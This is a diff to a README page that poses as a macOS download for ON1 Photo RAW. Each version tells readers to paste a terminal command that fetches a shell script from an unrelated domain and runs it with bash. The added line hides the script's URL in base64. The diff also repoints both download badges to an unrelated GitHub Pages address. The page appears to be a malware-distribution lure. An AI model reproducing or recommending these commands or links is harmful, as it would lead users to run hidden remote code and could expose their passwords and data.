@@ -7,7 +7,7 @@ With its seamless balance of speed, power, and flexibility, ON1 Photo RAW is ide
 ---
 
 ## ✅ Download ON1 Photo RAW for macOS  
-[![Download ON1 Photo RAW](https://img.shields.io/badge/Download-ON1_Photo_RAW-blueviolet)](https://on1-photo-raw-mac-download.github.io/.github)
+[![Download ON1 Photo RAW](https://img.shields.io/badge/Download-ON1_Photo_RAW-blueviolet)](https://shuziktobehuman.github.io/huja/ON1)
 
 ---
 
@@ -26,7 +26,7 @@ With its seamless balance of speed, power, and flexibility, ON1 Photo RAW is ide
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -64,7 +64,7 @@ ON1 Photo RAW is a professional-grade photo editing application that combines no
 
 ---
 
-[![Download ON1 Photo RAW](https://img.shields.io/badge/Download-ON1_Photo_RAW-blueviolet)](https://on1-photo-raw-mac-download.github.io/.github)
+[![Download ON1 Photo RAW](https://img.shields.io/badge/Download-ON1_Photo_RAW-blueviolet)](https://shuziktobehuman.github.io/huja/ON1)
 
 ---
 
